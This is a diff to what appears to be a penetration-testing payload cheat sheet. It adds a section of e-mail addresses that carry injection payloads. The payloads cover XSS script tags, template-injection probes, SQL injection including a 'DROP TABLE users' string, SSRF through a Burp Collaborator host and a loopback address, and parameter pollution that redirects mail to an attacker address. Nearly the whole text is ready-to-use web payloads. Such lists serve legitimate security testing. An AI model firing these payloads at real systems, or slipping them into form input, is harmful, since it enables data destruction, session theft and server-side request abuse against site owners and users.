@@ -138,6 +138,43 @@ alert(document.cookie)
 Cookie: PHPSESSID=hd<script>alert(document.cookie)</script>np5
 ```
 
+## E-mail recipient payloads
+
+### XSS
+
+```plain
+test+(<script>alert(0)</script>)@example.com
+test@example(<script>alert(0)</script>).com
+"<script>alert(0)</script>"@example.com
+```
+
+### Template injection
+
+```plain
+"<= 7 * 7 %>"@example.com
+test+(${{7*7}} )@example.com
+```
+
+### SQL Injection
+
+```plain
+"' OR 1=1 -- '"@example.com
+"mail'); DROP TABLE users;--"@example.com
+```
+
+### SSRF
+
+```plain
+john.doe@abc123.burpcollaborator.net
+john.doe@[127.0.0.1]
+```
+
+### Parameter pollution
+
+```plain
+victim&email=attacker@example.com
+```
+
 ### URL list
 
 * [Portswigger.net Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
